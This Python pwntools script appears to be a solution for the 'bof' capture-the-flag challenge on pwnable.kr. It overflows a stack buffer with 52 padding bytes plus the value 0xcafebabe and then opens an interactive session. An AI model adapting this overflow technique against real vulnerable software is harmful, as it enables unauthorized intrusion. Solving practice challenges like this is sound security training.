import sys
from pwn import *

context.clear(arch='i386')

isLocal = True
if sys.argv[1] == 'remote':
    isLocal = False
if sys.argv[2] == 'debug':
    context.log_level = 'debug'

if isLocal:
    r = process(argv=['./bof'])
    #r = gdb.debug(['./bof'],
    #gdbscript='''
    #b *0x56555654
    #c
    #''')
else:
    r = remote('pwnable.kr', 9000)

#r.recvuntil('overflow me : \x0a')
r.sendline('A' * 52 + p32(0xcafebabe))

r.interactive()

